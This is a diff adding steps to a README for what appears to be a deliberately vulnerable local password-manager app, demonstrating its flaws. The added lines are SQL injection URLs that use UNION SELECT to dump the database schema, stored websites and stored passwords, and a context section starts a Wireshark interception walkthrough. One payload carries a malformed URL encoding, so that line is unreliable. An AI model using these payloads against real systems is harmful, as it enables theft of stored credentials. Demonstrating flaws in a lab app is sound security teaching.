@@ -5,6 +5,12 @@ Before running this application, set the host paramter in the ```app.run()``` fu
     python3 backend.py
 
 ### Exploit 1: SQL Injection
+1. Create an account, log in, and save a password for some website.
+2. Then enter the following urls.
+3. http://127.0.0.1:5000/get_password/google'%20UNION%20ALL%20SELECT%20sql%20from%20sqlite_master;-- which gives all schema for database
+4. http://127.0.0.1:5000/get_password/google'%20UNION%20ALL%20SELECT%website%20from%20password_table;-- for all websites with passwords stored
+5. http://127.0.0.1:5000/get_password/google'%20UNION%20ALL%20SELECT%20password%20from%20password_table;-- for the corresponding passwords
+
 ### Exploit 2: Intercepting HTTP Requests
 1. Download WireShark
 2. Make sure you are on the same WiFi as targetted client (targetted client must be on a different device)
